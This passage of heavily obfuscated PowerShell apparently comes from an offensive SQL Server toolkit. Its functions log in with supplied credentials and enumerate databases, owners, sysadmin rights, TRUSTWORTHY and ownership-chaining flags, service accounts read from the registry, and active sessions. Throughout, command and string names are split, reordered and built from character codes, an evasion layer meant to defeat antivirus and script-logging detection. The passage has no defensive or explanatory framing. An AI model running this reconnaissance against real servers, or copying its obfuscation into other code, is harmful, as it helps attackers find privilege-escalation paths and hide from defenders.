        ${t`B`lD`ATaba`sES} = &("{0}{1}{2}" -f 'N','ew-','Object') -TypeName ("{3}{4}{0}{1}{2}{5}"-f'.Data.','DataT','abl','Sys','tem','e')
        ${N`Ull} = ${tb`Lda`T`AbAses}."cOl`U`Mns".("{0}{1}" -f'Ad','d').Invoke(("{2}{1}{3}{0}"-f 'me','omput','C','erNa'))
        ${N`Ull} = ${TBldA`TA`Bas`Es}."Co`luM`Ns".("{0}{1}"-f 'A','dd').Invoke(("{0}{1}"-f 'Instan','ce'))
        ${N`UlL} = ${TBl`D`AT`AbasES}."cOlum`Ns".("{1}{0}" -f'd','Ad').Invoke(("{2}{0}{1}" -f'ase','Id','Datab'))
        ${Nu`ll} = ${Tb`LdataBaS`Es}."CoL`UMNS".("{0}{1}"-f 'A','dd').Invoke(("{1}{3}{2}{0}"-f'e','Datab','Nam','ase'))
        ${NU`LL} = ${tbL`d`AT`A`BaSES}."co`LU`mnS".("{1}{0}"-f 'dd','A').Invoke(("{0}{4}{3}{1}{2}" -f'D','baseOwn','er','a','at'))
        ${NU`lL} = ${tB`L`Da`TabasEs}."CO`lUMnS".("{1}{0}"-f'd','Ad').Invoke(("{3}{2}{4}{1}{0}" -f 'n','i','rIsSysad','Owne','m'))
        ${nu`ll} = ${tB`l`dAt`A`BAseS}."cO`lu`mnS".("{1}{0}" -f 'd','Ad').Invoke(("{0}{2}{3}{1}" -f'is_','_on','trustwor','thy'))
        ${nu`ll} = ${T`BLDAt`A`BAses}."CO`LuMnS".("{1}{0}"-f'dd','A').Invoke(("{5}{0}{1}{2}{4}{3}" -f's_','d','b_ch','ing_on','ain','i'))
        ${nU`Ll} = ${T`BLd`At`ABasEs}."C`OLU`MNs".("{1}{0}"-f 'd','Ad').Invoke(("{4}{3}{5}{0}{2}{1}"-f'_ena','led','b','_b','is','roker'))
        ${N`ULl} = ${tbl`d`AtabA`S`ES}."CO`lumNS".("{0}{1}" -f'Ad','d').Invoke(("{1}{2}{0}"-f'crypted','is','_en'))
        ${NU`Ll} = ${T`B`l`DAT`AbASES}."c`O`LuMns".("{0}{1}"-f 'A','dd').Invoke(("{3}{2}{0}{1}"-f 'ead_','only','s_r','i'))
        ${Nu`lL} = ${T`BldAT`A`BaSES}."cO`LUMns".("{0}{1}" -f'A','dd').Invoke(("{1}{3}{2}{0}"-f'ate','c','eate_d','r'))
        ${nu`lL} = ${TbL`d`A`TabAsEs}."c`Olu`MNS".("{0}{1}" -f 'A','dd').Invoke(("{1}{4}{2}{0}{3}{5}" -f 'del_','reco','y_mo','des','ver','c'))
        ${Nu`lL} = ${tbld`A`T`ABAs`es}."COLu`MNS".("{0}{1}" -f 'Ad','d').Invoke(("{1}{0}{2}" -f 'ileNam','F','e'))
        ${N`ULl} = ${tbldA`TabA`SeS}."Col`UMnS".("{1}{0}"-f'd','Ad').Invoke(("{1}{2}{0}"-f 'eMb','DbSi','z'))
        ${N`ULl} = ${tB`lDatab`A`s`ES}."CoLU`Mns".("{0}{1}" -f 'Ad','d').Invoke(("{3}{1}{0}{2}"-f 'dbacces','as_','s','h'))

        if(${dAtA`BA`SENA`me}) {
            ${D`A`TaBaSEf`il`Ter} = (' '+'a'+'nd '+'a.na'+'me'+' '+'like'+' '+"'$DatabaseName'")
        } else {
            ${DA`Tab`ASE`FIl`TeR} = ''
        }

        if(${n`OdeFaul`TS}) {
            ${NO`DefaULtS`F`ilt`er} = ((("{11}{5}{4}{0}{8}{13}{10}{6}{3}{2}{7}{12}{9}{1}"-f' a.','nsmodelvns)',',vns','tervns','nd','a','vnsmas','te','name no','ns,v','(',' ','mpdbvns,vnsmsdbv','t in '))  -CrEpLace  ([cHaR]118+[cHaR]110+[cHaR]115),[cHaR]39)
        } else {
            ${Nod`E`FAULts`FILT`Er} = ''
        }

        if(${hasac`Ce`sS}) {
            ${hAs`Acc`es`sFiL`Ter} = (("{0}{4}{3}{2}{1}" -f ' and HAS_DBACCES','e)=1','a.nam','(','S'))
        } else {
            ${hAs`A`c`cesSFI`lTeR} = ''
        }

        if(${Sys`Adm`inonLY}) {
            ${s`ySadMino`NlY`FIltER} = ((("{11}{5}{1}{2}{12}{0}{13}{9}{8}{4}{3}{10}{6}{7}"-f'sa','EM','E','ER','US',' IS_SRVROL','E(a.owner_','sid))=1','vR,S','J','_SNAM',' and','MBER(JvRsy','dmin'))."R`epLa`CE"(([CHAR]74+[CHAR]118+[CHAR]82),[stRInG][CHAR]39))
        } else {
            ${S`ysaDmi`NOnl`yfil`TER} = ''
        }
    } Process {
        ${C`o`MPUtE`Rn`AMe} = &("{7}{1}{3}{4}{0}{5}{6}{2}" -f'u','-Co','FromInstance','m','p','te','rName','Get') -Instance ${Ins`TaN`Ce}

        if(-not ${I`N`StAncE}) {
            ${inS`T`An`Ce} = ${enV:`coMpuTE`Rn`AMe}
        }

        ${tEs`TConnecT`i`ON} = &("{3}{1}{4}{5}{0}{2}{6}"-f'io','-S','nT','Get','QLC','onnect','est') -Instance ${In`sta`NCe} -Username ${useRN`AMe} -Password ${PaS`sWo`RD} | &("{1}{2}{0}" -f'ct','Where-Obj','e') -FilterScript {
            ${_}."sTAt`US" -eq ("{2}{0}{1}" -f'c','essible','Ac')
        }

        if(${tES`Tc`O`NnectioN}) {
            if( -not ${s`UpPr`Es`sVe`RboSE}) {
                ("$Instance "+': '+'Con'+'necti'+'o'+'n '+'Su'+'c'+'cess.')
            }
        } else {
            if( -not ${S`UP`pR`E`ssVerBOse}) {
                ("$Instance "+': '+'C'+'onne'+'ction'+' '+'Failed'+'.')
            }
            return
        }

        ${SQL`SErV`E`Ri`NFo} = &("{0}{5}{1}{3}{4}{2}" -f 'Ge','-S','nfo','QLS','erverI','t') -Instance ${i`N`StANcE} -Username ${usEr`N`A`mE} -Password ${pa`SSw`oRD}
        if(${SQl`s`er`V`eRiNfO}."sql`SERVerveRS`IoNNUm`BEr") {
            ${s`qLVe`R`sIons`H`ORT} = ${S`Q`LseR`VErinFo}."sqls`ERv`ERVEr`siOnNUm`BEr".("{1}{0}"-f't','Spli').Invoke('.')[0]
        }

        ${q`U`er`YstaRt} = (' '+' '+'SE'+'LE'+'CT '+' '+"'$ComputerName' "+'a'+'s '+'[C'+'omputer'+'Name],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'a'+'s '+'[Inst'+'a'+'nce],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a.datab'+'a'+'se_'+'id'+' '+'as'+' '+'[Databas'+'eId],'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a.nam'+'e '+'as'+' '+'[Da'+'tab'+'ase'+'N'+'ame],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SUS'+'ER_SNA'+'ME('+'a.own'+'er'+'_sid'+') '+'as'+' '+'[Dat'+'abas'+'eO'+'wner],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('IS_SRVROLEME'+'MBER({0}sy'+'sa'+'dmi'+'n{0},S'+'USER_'+'SNAME(a'+'.owner'+'_'+'sid)) ')-F [CHAr]39+'as'+' '+'[Ow'+'n'+'e'+'rIsSysadm'+'in]'+','+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'.is'+'_tru'+'stworthy_on,
'+' '+' '+' '+' '+' '+' '+' '+' '+'a.is_db'+'_ch'+'ai'+'ni'+'ng_on,')

        if([int]${SqLvE`R`siON`Sh`ort} -ge 10) {
            ${qUERY`VeR`Spec} = ("{4}{10}{5}{11}{0}{13}{7}{15}{9}{6}{3}{2}{8}{1}{14}{12}"-f'     ',' a.is_read_o','ed,
','pt','
         ','roker_enab','  a.is_encry','    ','           ',' ','       a.is_b','led,
',',','  ','nly','  ')
        }

        ${Q`Ue`RYEND} = (("{26}{62}{52}{47}{38}{24}{11}{30}{59}{69}{72}{13}{53}{15}{42}{7}{10}{0}{41}{45}{76}{68}{39}{71}{49}{60}{35}{29}{77}{25}{51}{8}{56}{44}{21}{5}{34}{1}{28}{4}{23}{74}{3}{19}{61}{17}{67}{12}{18}{65}{75}{14}{20}{58}{40}{55}{70}{46}{48}{54}{22}{37}{73}{57}{63}{16}{50}{32}{2}{6}{64}{33}{9}{43}{66}{36}{27}{31}" -f'
            (SELE','wher','N ','ize','like a.na','ste','a.','me]','     ','id = b',',','ove','(a.name) as','          b.filen','      FROM [sys','as [FileN','s','    HA',' [has_db','Mb],
','].','a','NNER ','me)','     a.rec','2)','
     ','E 1','e name ','(8','ry','=1','es] b O','abase_','r_files ','L','id WHER','JOIN ','       ','S D','ta','CT ','a','.','sys.m','CAST(','] ','
','a
     ','M','ysdatabas',')
 ',',','ame ','   I','ba','      from ','].','[da','_model_','A','        ','       a.create_date','[','dat','access','db','S_DBACCESS','ze) * 8. / 1024 A','desc','ses','ECI',',
  ','[sys',' as [DbS',']
      ','SUM(si',','))

        ${f`IlTERs} = ('
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$DatabaseFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$NoDefaultsFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$HasAccessFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$SysAdminOnlyFilter
 "+' '+' '+' '+' '+' '+' '+' '+'ORD'+'ER '+'B'+'Y '+'a'+'.'+'d'+'atabase_id')

        ${Qu`ERY} = ("$QueryStart "+"$QueryVerSpec "+"$QueryEnd "+"$Filters")

        ${TbL`ReSuL`TS} = &("{0}{1}{2}{3}" -f 'G','et-S','QLQue','ry') -Instance ${INst`AN`CE} -Query ${Q`U`eRy} -Username ${uS`E`Rn`AME} -Password ${PASSwo`Rd}

        ${t`BLR`esUltS} | &("{3}{1}{2}{0}"-f't','orE','ach-Objec','F') -Process {
            if([int]${s`QLverS`IONS`ho`Rt} -ge 10) {
                ${i`S_broKER_`ena`BLEd} = ${_}."i`s_b`R`OKeR_ENABleD"
                ${is_en`CR`YPT`Ed} = ${_}."iS_eNCRy`pt`Ed"
                ${I`s_rEaD_o`Nly} = ${_}."IS_r`E`Ad`_onLY"
            } else {
                ${is_B`ROK`ER_eNa`B`L`Ed} = 'NA'
                ${i`S`_ENcrY`pT`ED} = 'NA'
                ${i`s_RE`AD_`ONlY} = 'NA'
            }

            ${n`Ull} = ${TbLD`AT`A`BaS`Es}."RO`ws".("{0}{1}"-f 'Ad','d').Invoke(
                ${_}."Co`mPUTERn`AMe",
                ${_}."I`NSTAN`CE",
                ${_}."D`AtaBaSE`iD",
                ${_}."Dat`ABaSen`AmE",
                ${_}."dAtab`Aseow`N`eR",
                ${_}."OwN`e`RiSs`YSaDmin",
                ${_}."iS_`TR`U`STWorTHY_On",
                ${_}."iS_db_CHa`i`N`iNg_`ON",
                ${Is`_brOKE`R_`E`NaB`LeD},
                ${IS`_E`NcryPTED},
                ${is_ReA`d`_`only},
                ${_}."cREaT`e_`D`Ate",
                ${_}."R`EcoV`eRy_mOdEl_`D`eSC",
                ${_}."fIlE`N`AME",
                ${_}."D`BsIZ`emb",
                ${_}."h`A`S_D`BACcESs"
            )
        }

    } End {
        ${tB`L`Dat`ABAseS}
    }
}
Function GEt-`s`qlsERvERIN`FO {
    [CmdletBinding()]
    Param(
        [Parameter(MaNDatoRY = ${FA`l`SE},
	vAluEfrOMpipELinEbYProPertynamE = ${TR`UE},
        HELpMeSsAgE = {"{11}{7}{2}{4}{3}{9}{6}{0}{10}{5}{8}{1}"-f ' ','th.','or d',' a','omain','ate w','nt','QL Server ','i','ccou','to authentic','S'})]
        [string]${USer`N`AmE},
        [Parameter(mandAtORY = ${fa`LsE},
	VALuEFROmpIPElInEBYPropErTYnAmE = ${Tr`Ue},
        HeLPmesSagE = {"{9}{8}{4}{0}{10}{6}{11}{1}{3}{5}{7}{2}"-f'Serve',' accoun',' with.','t password',' ',' t','mai','o authenticate','L','SQ','r or do','n'})]
        [string]${PAss`W`Ord},
        [Parameter(ManDAtoRY = ${fAL`se},
	ValUEfROmPIpeLInebyPROPErtYNaMe = ${T`RUe},
        hElpMeSsaGE = {"{10}{6}{2}{8}{0}{5}{7}{3}{1}{4}{9}"-f' ','i','r instance t','t','on','con','rve','nec','o',' to.','SQL Se'})]
        [string]${inStA`N`cE}
    )
    Begin {
        ${T`BlsE`RvER`InfO} = &("{0}{1}{2}"-f 'N','ew-Objec','t') -TypeName ("{4}{0}{1}{2}{5}{3}" -f'.D','ata','.Dat','Table','System','a')
    } Process {
        ${C`o`Mp`UTErna`ME} = &("{2}{5}{8}{4}{0}{1}{3}{6}{7}"-f 'erNa','meFrom','Ge','Ins','ut','t-Com','tan','ce','p') -Instance ${in`sTAN`cE}
        if(-not ${InST`An`Ce}) {
            ${iN`STAN`cE} = ${enV`:`c`Om`PuTErNAMe}
        }
        ${TE`ST`CoN`Ne`Ction} = &("{2}{3}{1}{0}{4}"-f 'es','onT','Get-SQLC','onnecti','t') -Instance ${i`NSTan`CE} -Username ${Use`RN`AmE} -Password ${p`Assw`o`RD} | 
        &('?') -FilterScript {
            ${_}."S`T`AtuS" -eq ("{0}{2}{1}"-f 'Acce','le','ssib')
        }
        if(-not ${Te`S`TcoNNeC`Tion}) {
            ("$Instance "+': '+'Conne'+'ction'+' '+'Fai'+'led.')
            return
        }
        ${ACTiV`eSes`sIO`NS} = &("{0}{2}{1}{3}" -f'Get-','QLSe','S','ssion') -Instance ${in`S`TAncE} -Username ${uSER`NAmE} -Password ${p`AsS`WORd} |
        &('?') -FilterScript { ${_}."sesS`I`OnsTA`Tus" -eq ("{0}{2}{1}"-f 'r','ng','unni') } | &("{0}{1}{2}"-f 'meas','ur','e') -Line | &("{2}{0}{1}"-f 'l','ect','se') -Property ("{1}{0}" -f'ines','L') -ExpandProperty ("{0}{1}" -f 'Li','nes')
        ${iss`ys`A`dmIn} = &("{4}{1}{2}{5}{3}{0}" -f 'dminCheck','e','t','Sysa','G','-SQL') -Instance ${iN`s`TANce} -Username ${u`sER`Name} -Password ${PASs`WOrd}
        if(${iSs`y`SAdMiN}."i`SSY`S`ADmIN" -eq 'Yes') {
            ${sysadmI`Nse`TUP} = ((("{67}{149}{73}{44}{105}{65}{79}{56}{47}{45}{28}{131}{0}{133}{135}{87}{6}{113}{90}{89}{51}{23}{21}{130}{129}{144}{76}{125}{158}{41}{64}{8}{107}{36}{71}{155}{148}{153}{48}{19}{20}{24}{104}{72}{147}{106}{110}{2}{100}{94}{102}{168}{10}{29}{58}{9}{137}{4}{170}{35}{171}{160}{15}{54}{166}{63}{141}{57}{40}{122}{138}{62}{114}{88}{96}{123}{42}{139}{81}{18}{134}{37}{169}{22}{38}{50}{17}{142}{77}{84}{128}{146}{49}{78}{157}{117}{60}{124}{154}{95}{92}{103}{25}{61}{85}{115}{16}{93}{33}{108}{43}{69}{27}{120}{55}{101}{111}{39}{136}{70}{167}{118}{13}{116}{156}{126}{59}{1}{152}{75}{143}{98}{7}{31}{151}{91}{121}{119}{83}{82}{132}{52}{150}{127}{53}{68}{14}{112}{162}{12}{163}{3}{159}{74}{165}{34}{30}{11}{5}{164}{99}{109}{46}{145}{161}{140}{66}{86}{80}{32}{26}{97}" -f' ',' ',',
 ','e_','lSet','}','ME
','key			= ','  ','EM{0}Curre','y			= ','Name{1','               ','L_MAC','on{1','O','a','e','pe','r','ootk',' ma','chin','   EXECUTE','ey		= N{1',' ','utpu','
             ','eT','N','roduct','N{','ame o','bo.x','N{1}P','0}Co',' ','@value			= ','eTy','N{1}HK',' ','gre','_name		= N{1','a','  DE','n','  ','i','@','      ','p','     ',' NT{0}Cur','tVers','p','@r','ach',' ','{1}SYST',',
 ','oduct','       ','   ','s{1}','ad
     ','LARE','@','
      ','i','d','_LO','  ','_MA',' ','ame		','       ','dbo','ut',' DE',' @M','uctN','y','{0}Windo','rosoft','put','    EXECUT','Prod','A','    ',' ','    ','FTWARE{0}','A','ster.d','  ',' SYSN','@va','t',' @','        ','     ','ootkey','   ','ME
    ','}HKEY_LOCAL','C','INE',' ','p_regre','     ','{1}','		= ','}','   ',' ','E m','H',' @Pr','A','ic','   ','M','  ','lue','Name','.xp_r','E{1}','en','
      ','e','st','ype','ws',' SY','{1},
                ','SN','EY','ntContro',' ','}ProductT',' ',',
   ',' o','     ','r.','@value','   ','CH',' ','       ','r','1}SO',' ',' ',' ','   ','IN','CLARE','e','n','trol{0}Product','			=',',
 ','@valu',',
 ','= ','tion','C','     @ke','@Ma','{','n'))  -f  [CHar]92,[CHar]39)
            ${S`y`SadmI`NQueRy} = ("{9}{8}{13}{14}{12}{4}{3}{2}{1}{5}{7}{0}{10}{11}{15}{6}"-f 'e as [','  @Produc','        ','     ','
 ','t','Name],','Nam','@Mac','  ','OSV','ers','s [OsMachineType],','hineType',' a','ion')
        } else {
            ${SYSADM`I`NsEt`UP} = ''
            ${s`Ysa`dMinQUeRY} = ''
        }

        ${Q`UE`Ry} = ('
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DEC'+'LARE'+' '+'@S'+'QLServe'+'r'+'I'+'nstance '+'varchar(2'+'50)'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'D'+'ECLAR'+'E '+'@SQLServe'+'rServ'+'ice'+'Name '+'v'+'archa'+'r'+'(250)'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'i'+'f '+'@@'+'SE'+'RVICENAME '+'= '+('{0'+'}MSSQLS'+'E'+'R'+'V'+'ER{'+'0}
 ') -f[CHAr]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'B'+'EGIN
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'set'+' '+'@'+'SQ'+'LServerInst'+'anc'+'e '+'= '+('qD'+'QSYSTEMucQCu'+'r'+'rentControlSe'+'t'+'u'+'cQSe'+'rv'+'ic'+'e'+'sucQMSS'+'QLSERVE'+'RqDQ'+'
 ')."r`e`PlacE"('qDQ',[StRiNg][chAr]39)."r`EPLa`ce"(([chAr]117+[chAr]99+[chAr]81),'\')+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s'+'et '+'@S'+'QLServerServ'+'i'+'ceNam'+'e '+'= '+('{0}M'+'SSQL'+'SE'+'RV'+'ER{0}'+'
 ')  -F[cHaR]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'END'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EL'+'SE
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'BE'+'GI'+'N
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'set'+' '+'@SQLSer'+'ve'+'rI'+'nst'+'ance '+'= '+"'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME "+'as'+' '+'varcha'+'r(250))
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'set'+' '+'@'+'S'+'QLServer'+'S'+'e'+'rvic'+'eName '+'= '+"'MSSQL$'+cast(@@SERVICENAME "+'a'+'s '+'va'+'rchar(25'+'0'+'))
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EN'+'D

 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DECL'+'A'+'RE '+'@'+'S'+'e'+'rviceacc'+'ou'+'ntName '+'v'+'a'+'rchar('+'250)
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EXE'+'CU'+'TE '+'mas'+'ter.'+'db'+'o'+'.'+'xp_instan'+'ce_regre'+'a'+'d'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('NVEJH'+'KEY_LO'+'CAL_'+'MA'+'CHINE'+'VEJ, ')  -REplAce ([char]86+[char]69+[char]74),[char]39)+'@'+'S'+'QLS'+'erverInstance'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('NuUMObjectName'+'uU'+'M'+',@Se'+'rv'+'iceAc'+'cou'+'ntName ') -cRePlacE  ([char]117+[char]85+[char]77),[char]39)+'O'+'UT'+'PUT, '+('N{'+'0}no'+'_'+'out'+'put{0}

 ')  -F [chAr]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DEC'+'LARE '+'@Auth'+'e'+'nticat'+'ion'+'Mo'+'de '+'IN'+'T
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EXEC'+' '+'m'+'aster.dbo'+'.x'+'p_insta'+'nce_re'+'gread'+' '+('N'+'NUHH'+'K'+'E'+'Y'+'_'+'L'+'OCAL_MACHINEN'+'UH,
 ')."REpL`A`ce"(([ChAR]78+[ChAR]85+[ChAR]72),[striNg][ChAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('N{1}So'+'ftware{0'+'}'+'Mi'+'crosoft{0}MSSQ'+'L'+'Serve'+'r{0}MS'+'SQ'+'LS'+'erver{1},
 ') -F[char]92,[char]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('N'+'84PLog'+'in'+'Mod'+'e84P, ')-REpLAce ([CHaR]56+[CHaR]52+[CHaR]80),[CHaR]39)+'@Authent'+'i'+'c'+'at'+'ionMode '+'O'+'UTPU'+'T

 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$SysadminSetup

 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SE'+'LECT '+' '+"'$ComputerName' "+'as'+' '+'[C'+'ompu'+'ter'+'Nam'+'e],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@'+'@s'+'e'+'rvername '+'a'+'s '+'['+'Inst'+'ance]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DEF'+'AULT_D'+'OMAI'+'N'+'() '+'as'+' '+'[D'+'om'+'ainName],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@SQLSer'+'ve'+'r'+'S'+'ervice'+'Name'+' '+'as'+' '+'[ServiceNam'+'e]'+','+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@S'+'erv'+'iceAc'+'co'+'un'+'tName '+'a'+'s '+'[S'+'ervic'+'e'+'Account],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'(SEL'+'E'+'CT '+'CAS'+'E '+'@Au'+'thenti'+'cationMod'+'e'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'WHEN'+' '+'1 '+'T'+'HEN '+(('lvH'+'W'+'in'+'dows ') -creplace  ([cHaR]108+[cHaR]118+[cHaR]72),[cHaR]39)+('Au'+'thenti'+'cation2a'+'6
'+' ')."Re`pla`cE"(([CHAr]50+[CHAr]97+[CHAr]54),[stRING][CHAr]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'WHEN'+' '+'2 '+'THE'+'N '+(('sXzWind'+'ows ')  -CrEpLace ([cHAR]115+[cHAR]88+[cHAR]122),[cHAR]39)+'an'+'d '+'SQ'+'L '+'S'+'erve'+'r '+(('A'+'uthenticati'+'on'+'k'+'pg
 ') -cRepLace  ([cHAr]107+[cHAr]112+[cHAr]103),[cHAr]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ELS'+'E '+('{0}'+'U'+'nk'+'nown{0}
 ')  -f[char]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'E'+'ND) '+'a'+'s '+'[Au'+'thent'+'icat'+'ionMode],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'C'+'ASE '+' '+('SERVER'+'P'+'RO'+'P'+'ERTY({'+'0}Is'+'C'+'lus'+'t'+'er'+'ed{0})
 ') -f [cHAR]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'WHEN'+' '+'0'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'T'+'HEN '+('BW'+'GNoBW'+'G'+'
 ')."rE`PL`Ace"('BWG',[StRiNg][chAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EL'+'SE '+(('T'+'IkY'+'esTIk
 ') -REplaCE  ([cHAR]84+[cHAR]73+[cHAR]107),[cHAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'E'+'ND '+'a'+'s '+'[Cl'+'ustere'+'d],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('S'+'ERVER'+'P'+'RO'+'PERT'+'Y(T0iproductversionT'+'0i) ')."REP`lace"('T0i',[STRInG][ChaR]39)+'as'+' '+'['+'SQLSe'+'rve'+'rVe'+'rsion'+'Num'+'ber],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SUBSTRI'+'N'+'G(@@VE'+'RSION'+', '+(('CH'+'A'+'RIND'+'EX('+'CBb2CBb, ')-crePLaCe  ([chaR]67+[chaR]66+[chaR]98),[chaR]39)+'@@'+'VER'+'SION'+'), '+'4'+') '+'a'+'s '+'[SQLServerMajorVers'+'i'+'on'+']'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('serve'+'rproperty(o'+'PvEd'+'it'+'iono'+'Pv)'+' ')."r`E`plaCe"('oPv',[stRiNG][char]39)+'as'+' '+'[SQLServer'+'E'+'ditio'+'n],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('SE'+'R'+'V'+'E'+'RPROPERT'+'Y(8POPr'+'oductLeve'+'l'+'8'+'PO) ')."R`epL`AcE"(([cHar]56+[cHar]80+[cHar]79),[sTrinG][cHar]39)+'A'+'S '+'[SQ'+'LSe'+'rverS'+'ervicePack],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SUBSTR'+'I'+'NG(@@VERS'+'ION, '+('CHARIND'+'EX'+'({'+'0'+'}x{0}'+', ')-f  [CHAr]39+'@@V'+'ERSI'+'ON), '+'3'+') '+'as'+' '+'[OS'+'Archi'+'tect'+'ure],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$SysadminQuery
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'RIGHT(SUBSTRIN'+'G(@@'+'V'+'ER'+'SIO'+'N'+', '+(('CHARI'+'NDEX('+'H'+'5sWi'+'ndow'+'s ')  -crepLace([CHAr]72+[CHAr]53+[CHAr]115),[CHAr]39)+('NT{0}, ')  -f  [chAR]39+'@'+'@'+'VERSION)'+', '+'14)'+', '+'3'+') '+'a'+'s '+'[OsVersionNu'+'mb'+'er],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SYSTEM_'+'U'+'SER '+'a'+'s '+'[Cur'+'r'+'e'+'ntlogi'+'n],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$IsSysadmin' "+'as'+' '+'[IsS'+'ysad'+'min],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$ActiveSessions' "+'as'+' '+'[Ac'+'t'+'iveSessions'+']')
        ${tB`LS`e`RV`ERInFo`TEmP} = &("{2}{3}{1}{0}"-f'LQuery','SQ','Ge','t-') -Instance ${INsT`AN`CE} -Query ${qu`eRY} -Username ${US`eRn`AMe} -Password ${PaSswO`Rd}
        ${t`BLS`erveRiNfO} = ${tb`lSER`VE`R`InFO} + ${tbL`Serv`e`RInFOTEMP}
        ${t`B`lSErvERiNfo}
    } End {
    }
}
Function Ge`T-sQlSe`ssiON {
    [CmdletBinding()]
    Param(
        [Parameter(maNDaTOrY = ${F`ALse},
        helPmESSagE = {"{2}{8}{7}{5}{0}{6}{4}{3}{1}" -f'r doma','ith.','SQL','thenticate w','n account to au',' o','i','ver',' Ser'})]
        [string]${UsEr`N`Ame},
        [Parameter(MaNdAtory = ${fA`LsE},
        hELpmeSSAGe = {"{1}{0}{5}{2}{10}{7}{9}{11}{3}{4}{8}{6}" -f 'ver o','SQL Ser',' domain','word ','t','r','enticate with.','t ','o auth','p',' accoun','ass'})]
        [string]${pass`WO`RD},
        [Parameter(MANdAtoRy = ${F`AlSE},
        hELPmesSagE = {"{3}{4}{6}{1}{2}{0}{7}{5}"-f'nnecti','ta','nce to co','SQL',' Server ','n to.','ins','o'})]
        [string]${inStan`cE},
        [Parameter(mANDaToRY = ${f`ALSe},
        HELpmessAGe = {"{3}{0}{2}{1}" -f'Na','e.','m','Principal'})]
        [string]${P`R`inc`ipaLNA`ME}
    )
    Begin {
        ${TbLS`essi`ONS} = &("{0}{2}{3}{1}"-f'N','ject','e','w-Ob') -TypeName ("{2}{4}{0}{1}{3}"-f'm.Data.DataTa','b','Syst','le','e')
        ${N`ULL} = ${TBL`seS`S`IOns}."CoL`UM`Ns".("{1}{0}" -f'dd','A').Invoke(("{0}{1}{2}"-f'Comp','uterNa','me'))
        ${nU`Ll} = ${T`Bl`SEssIOnS}."CoLU`MNs".("{1}{0}"-f'dd','A').Invoke(("{1}{0}" -f'nstance','I'))
        ${N`UlL} = ${t`BLses`SIONS}."colu`MnS".("{1}{0}" -f'dd','A').Invoke(("{3}{1}{2}{0}"-f 'd','cipal','Si','Prin'))
        ${N`ULL} = ${T`B`lSeSSiO`Ns}."ColU`MNs".("{0}{1}"-f 'Ad','d').Invoke(("{0}{2}{1}{3}"-f'Prin','a','cip','lName'))
